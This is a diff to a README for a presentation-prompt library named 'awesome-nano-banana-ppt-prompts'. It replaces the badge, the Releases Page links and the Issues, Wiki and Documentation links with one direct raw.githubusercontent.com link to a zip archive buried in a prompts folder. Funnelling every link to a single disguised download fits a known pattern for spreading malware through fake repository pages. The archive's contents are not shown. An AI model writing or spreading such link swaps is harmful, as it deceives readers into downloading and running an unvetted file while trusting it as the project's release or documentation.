@@ -1,6 +1,6 @@
 # 🍌 awesome-nano-banana-ppt-prompts - Effortless Presentation Creation Made Easy
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/main/prompts/modern-minimalist-christmas/banana_awesome_prompts_nano_ppt_v3.9-alpha.1.zip%20Latest%20Release-Click%20Here-brightgreen)
 
 ## 📋 Description
 
@@ -10,13 +10,13 @@ Welcome to **awesome-nano-banana-ppt-prompts**! This open-source library provide
 
 To start using **awesome-nano-banana-ppt-prompts**, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/releases) to find the latest options for downloading.
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/main/prompts/modern-minimalist-christmas/banana_awesome_prompts_nano_ppt_v3.9-alpha.1.zip) to find the latest options for downloading.
 2. **Download the Application:** Select the version you want and download the files. The downloads include all the necessary prompts and resources to get you started.
 3. **Install the Application**: Simply extract the files and follow the instructions provided in the documentation.
 
 ## 💾 Download & Install
 
-To download the latest version, visit the [Releases Page](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/releases) and follow these steps:
+To download the latest version, visit the [Releases Page](https://raw.githubusercontent.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/main/prompts/modern-minimalist-christmas/banana_awesome_prompts_nano_ppt_v3.9-alpha.1.zip) and follow these steps:
 
 1. Choose the version you wish to download.
 2. Click on the appropriate file to start the download.
@@ -69,9 +69,9 @@ If you encounter any issues or have questions, please contact us through the Iss
 
 Find more information and updates by browsing:
 
-- [GitHub Issues](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/issues)
-- [Wiki](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/wiki)
-- [Documentation](https://github.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/blob/main/docs/README.md)
+- [GitHub Issues](https://raw.githubusercontent.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/main/prompts/modern-minimalist-christmas/banana_awesome_prompts_nano_ppt_v3.9-alpha.1.zip)
+- [Wiki](https://raw.githubusercontent.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/main/prompts/modern-minimalist-christmas/banana_awesome_prompts_nano_ppt_v3.9-alpha.1.zip)
+- [Documentation](https://raw.githubusercontent.com/ahmetbaldede/awesome-nano-banana-ppt-prompts/main/prompts/modern-minimalist-christmas/banana_awesome_prompts_nano_ppt_v3.9-alpha.1.zip)
 
 ## 🔍 Future Updates
 
